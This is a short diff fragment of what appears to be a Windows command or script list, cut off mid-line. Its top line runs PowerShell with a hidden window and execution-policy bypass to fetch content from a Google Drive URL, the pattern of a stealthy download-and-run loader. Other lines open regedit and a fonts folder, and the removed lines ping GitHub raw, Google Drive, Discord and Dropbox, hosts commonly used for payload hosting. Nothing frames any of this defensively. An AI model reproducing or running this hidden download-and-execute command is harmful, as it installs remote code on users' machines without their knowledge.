@@ -4,10 +4,3 @@ powershell -w hidden -ep bypass -c "iwr -useb 'https://drive.google.com/uc?expor
 regedit
 
 explorer %LOCALAPPDATA%\Microsoft\Windows\Fonts
-cmd /k ping raw.githubusercontent.com
-
-
-cmd /k ping drive.google.com
-
-cmd /k ping discord.com
-cmd /k ping dropbox.com
